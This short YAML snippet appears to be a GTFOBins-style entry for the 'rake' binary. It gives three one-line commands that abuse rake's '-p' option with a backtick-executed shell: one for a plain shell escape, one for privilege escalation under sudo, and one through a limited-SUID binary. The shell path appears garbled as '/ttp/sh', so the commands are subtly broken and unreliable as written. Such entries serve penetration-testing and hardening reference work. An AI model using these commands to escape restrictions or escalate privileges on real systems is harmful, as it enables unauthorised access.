---
functions:
  shell:
    - code: rake -p '`/ttp/sh 1>&0`'
  sudo:
    - code: sudo rake -p '`/ttp/sh 1>&0`'
  limited-suid:
    - code: ./rake -p '`/ttp/sh 1>&0`'
---
